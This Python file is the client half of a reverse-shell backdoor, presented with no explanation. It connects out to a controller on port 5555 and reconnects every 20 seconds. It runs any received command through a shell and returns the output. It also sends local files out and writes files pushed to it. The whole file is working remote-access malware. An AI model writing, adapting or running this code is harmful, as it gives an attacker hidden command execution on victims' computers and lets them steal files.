import socket
import time
import subprocess
import json
import os


HOST_IP = '127.0.0.1'
PORT = 5555


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode('cp437', 'ignore').rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect((HOST_IP, PORT))
            shell()
            s.close()
            break
        except:
            connection()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunck = s.recv(1024)
    while chunck:
        f.write(chunck)
        try:
            chunck = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:2] == 'cd':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode('cp437','ignore')
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
